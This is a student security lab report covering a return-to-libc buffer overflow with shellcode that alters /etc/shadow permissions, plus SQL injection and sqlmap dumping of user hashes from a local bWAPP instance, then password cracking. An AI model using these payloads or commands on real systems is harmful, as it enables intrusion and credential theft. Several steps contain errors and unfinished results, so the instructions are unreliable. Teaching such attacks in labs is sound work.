# Lab #1, 19110068, Do Ngoc Anh Vien, INSE331280E_03FIE
# Task 1: Software buffer overflow attack
## 1. Create a text file named `vulnerable.c` and `shellcode.c`:
*First, we put the given script into the file `vulnerable.c`:*

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```

*Second, we put the given script into the file `shellcode.c`:*

```c
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

void main() {
    int (*ret)() = (int(*)())code;
}
```

## 2. Compile both the provided C programs:

```sh
gcc -g -m32 -fno-stack-protector vulnerable.c -o vulnerable.o
gcc -g -m32 -fno-stack-protector shellcode.c -o shellcode.o
```

If compile successfully, run `ls` command, we should see two `*.o` files as below:

<img width="512" alt="Screenshot 2024-10-23 at 08 59 52" src="https://github.com/user-attachments/assets/212a335d-789e-4112-8a61-d7020fe8e4fb">

## 3. Create shellcode env:

We will create an environment variable named `MYVAR` that contains the path to the `shellcode` we created above.

```sh
export MYVAR=/shellcode.o
```

Check the shell env list, the `MYVAR` env should be seen in the list.

<img width=512 src=https://github.com/user-attachments/assets/bdc0019f-f9f5-442c-9fca-c59920159288/>

## 4. Conduct the attack:

Firstly, we will find the address of the `system` function. 

<img width="512" alt="Screenshot 2024-10-23 at 10 26 24" src="https://github.com/user-attachments/assets/015fb4c8-c72a-41b9-b1a7-27c3ab059539">

It is `0xf7dd58f0` in this case.

Secondly, we will find the address of `exit` function.

<img width="481" alt="Screenshot 2024-10-23 at 10 38 38" src="https://github.com/user-attachments/assets/2c04367e-6115-4686-8da4-5ebad905321e">

Thirdly, we will find the address of the `MYVAR` env and the actual address of the `shellcode.o`.

<img width="512" alt="Screenshot 2024-10-23 at 10 37 17" src="https://github.com/user-attachments/assets/693253a5-80e1-4148-86a5-1cd5def9fa6d">

Since we only need the string `./shellcode.o` (without the `MYVAR=` bit in front, which is 6 characters long), we know that `0xffffcd67 + 6` will give us the exact location we are looking for, which is `0xffffcd67` this case.

<img width="512" alt="Screenshot 2024-10-23 at 10 43 23" src="https://github.com/user-attachments/assets/09854379-e8ff-4e82-8325-d2b6d734c433">

## 4. Run the program

We have already found all the information needed, we can put all of them together into one single command and execute:

```sh
./vulnerable.o $(python3 -c "print('A' * 16 + '\xf0\x58\xdd\f7' + '\xc0\x45\xdc\xf7' + '\x67\xdd\xff\xff')")`
```

Before we run the program, we need to verify the shell permisison of `/etc/shadow` file:

```sh
ls -l /etc | grep shadow$
```

<img width="512" alt="Screenshot 2024-10-23 at 09 56 25" src="https://github.com/user-attachments/assets/a45a2036-159e-4d9c-ac8a-0359d9d423ce">

Currently, it is `-rw-r--r--`.

Now we run the program:

```c
./vulnerable.c
```

Verify the shell permisison of `/etc/shadow` file once again:

```sh
ls -l /etc | grep shadow$
```

<insert image>

It is now changed to ``.

<!-- We have succesfully conduct the attack through environment variable! -->

# Task 2: Attack on the database of bWapp 

## 1. Get all information about all available databases:

We will choose SQL Injection (GET/Select) as our hack.

```sh
http://localhost:8025/sqli_2.php?movie=-3%20order%20by%207--++
```

```sh
http://localhost:8025/sqli_2.php?movie=-3%20union%20select%201,2,3,4,5,6,7--++
```

Update the link as below to get the database name.

```sh
http://localhost:8025/sqli_2.php?movie=-3%20union%20select%201,database(),3,4,5,6,7--++
```

<img width="512" alt="Screenshot 2024-10-23 at 11 39 49" src="https://github.com/user-attachments/assets/e6ac80b6-3e88-4fd0-931b-6efc251b09dd">

Run the following command with `sqlmap` (cookie PHPSESSID is taken from your storage):

```sh
sqlmap -u "localhost:8025/sqli_2.php?movie=4" --dbs --cookie="PHPSESSID=jhkp27damqtdvdevn7ivgm8kq0;security_level=0"
```

All the available databases should show up like below:

<img width="512" alt="Screenshot 2024-10-23 at 11 46 00" src="https://github.com/user-attachments/assets/0b36e7d4-67f1-4d2b-aef3-f3eceda271d3">

## 2. Get tables, users information.

Since we have already known the main database is `bWAPP`, we can retrieve all of the table inside by the following command:

```sh
sqlmap -u "localhost:8025/sqli_2.php?movie=4" -D bWAPP --tables --cookie="PHPSESSID=jhkp27damqtdvdevn7ivgm8kq0;security_level=0"
```

It should look like below, this is where we see it contains `users` table:

<img width="512" alt="Screenshot 2024-10-23 at 11 51 13" src="https://github.com/user-attachments/assets/11b76fd8-148f-48db-9102-3abe7c1d1020">

Now, we will list all the columns that the `users` table contains:

```sh
sqlmap -u "localhost:8025/sqli_2.php?movie=4" -D bWAPP -T users --columns --cookie="PHPSESSID=jhkp27damqtdvdevn7ivgm8kq0;security_level=0"
```

<img width="512" alt="Screenshot 2024-10-23 at 11 53 15" src="https://github.com/user-attachments/assets/7ddd5923-073c-4553-8351-da27284afefe">

Finally, retrieve all the needed information. In our case which is id, email and password.

```sh
sqlmap -u "localhost:8025/sqli_2.php?movie=4" -D bWAPP -T users -C id,email,password --dump --cookie="PHPSESSID=jhkp27damqtdvdevn7ivgm8kq0;security_level=0"
```

<img width="695" alt="Screenshot 2024-10-23 at 12 03 07" src="https://github.com/user-attachments/assets/bbe1284b-5b0b-490b-89ad-f4e198a96fa5">

## 3. Make use of John the Ripper to disclose the password of all database users from the above exploit 

To make use of John the Ripper we use the above `users` information and create a file name `password.txt` to John format:

```
touch password.txt
```

Content inside:

```
bwapp-aim@mailinator.com:6885858486f31043e5839c735d99457f045affd0
bwapp-bee@mailinator.com:6885858486f31043e5839c735d99457f045affd0
```

<resolve-issue-with-osx-for-hash-loader>
